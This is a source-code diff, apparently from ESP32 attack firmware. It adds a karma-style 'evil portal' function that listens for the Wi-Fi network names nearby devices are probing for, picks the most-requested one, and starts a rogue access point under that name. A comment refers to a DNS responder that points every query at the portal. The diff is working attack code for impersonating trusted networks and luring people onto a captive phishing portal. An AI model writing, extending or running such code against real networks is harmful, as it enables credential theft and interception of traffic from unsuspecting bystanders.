@@ -21,6 +21,7 @@
 #include "lwip/sockets.h"
 
 #include "lxveos_arm.h"
+#include "lxveos_wifi.h"
 
 static const char *TAG = "lxveos_evilportal";
 
@@ -206,6 +207,41 @@ void lxveos_evilportal_templates_each(lxveos_evilportal_tmpl_cb cb)
     for (size_t i = 0; i < EP_TEMPLATE_N; i++) {
         cb(TEMPLATES[i].id, TEMPLATES[i].name, i == s_template);
     }
+}
+
+esp_err_t lxveos_evilportal_start_karma(char *chosen, size_t chosen_sz)
+{
+    if (s_running) {
+        return ESP_ERR_INVALID_STATE;
+    }
+    if (!lxveos_arm_can_emit()) {
+        return ESP_ERR_NOT_ALLOWED;
+    }
+    // Demand-driven lure: listen for the SSIDs nearby clients are actively probing for, then pick the single
+    // most-requested real one and stand the portal up as that. One SSID, driven by observed client demand —
+    // NOT a beacon-spam list. (Injection-based multi-SSID karma is the beacon-spam class and lives upstream.)
+    static lxveos_wifi_probe_t pr[32];
+    size_t found = 0;
+    uint32_t total = 0, wildcard = 0;
+    esp_err_t e = lxveos_wifi_probe_scan(10, 0, pr, sizeof(pr) / sizeof(pr[0]), &found, &total, &wildcard);
+    if (e != ESP_OK) {
+        return e;
+    }
+    const char *best = NULL;
+    uint32_t best_count = 0;
+    for (size_t i = 0; i < found; i++) {
+        if (pr[i].ssid[0] != '\0' && pr[i].count > best_count) {
+            best_count = pr[i].count;
+            best = pr[i].ssid;
+        }
+    }
+    if (best == NULL) {
+        return ESP_ERR_NOT_FOUND;  // no directed probe requests seen — nothing to lure with
+    }
+    if (chosen != NULL && chosen_sz > 0) {
+        store_field(chosen, chosen_sz, best);
+    }
+    return lxveos_evilportal_start(best);
 }
 
 // Minimal DNS responder: answer every query with the AP IP (192.168.4.1) so a client's captive-portal
